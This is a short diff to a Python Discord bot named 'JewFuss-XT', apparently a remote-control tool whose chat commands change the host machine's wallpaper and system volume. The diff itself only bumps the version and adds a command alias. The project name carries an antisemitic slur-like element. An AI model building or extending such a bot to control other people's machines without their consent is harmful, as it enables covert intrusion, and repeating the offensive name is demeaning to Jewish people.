@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.13" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.14" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -249,7 +249,7 @@ async def wallpaper(ctx, action: str = None, filepath: str = None):
     except Exception as e:
         await ctx.send(f"Error processing wallpaper command: {str(e)}")
 
-@bot.command(help="Set or check system volume.", usage="$vol <up|down|set|mute|unmute|query> [value]")
+@bot.command(aliases=["volume"], help="Set or check system volume.", usage="$vol <up|down|set|mute|unmute|query> [value]")
 async def vol(ctx, action: str = "query", value: int = None):
     try:
         devices = AudioUtilities.GetSpeakers()
@@ -272,6 +272,7 @@ async def vol(ctx, action: str = "query", value: int = None):
             if value is None or not (0 <= value <= 100):
                 await ctx.send("Please provide a valid volume percentage (0-100).")
                 return
+            
             volume.SetMasterVolumeLevelScalar(value / 100, None)
             await ctx.send(f"Volume set to {value}%")
 
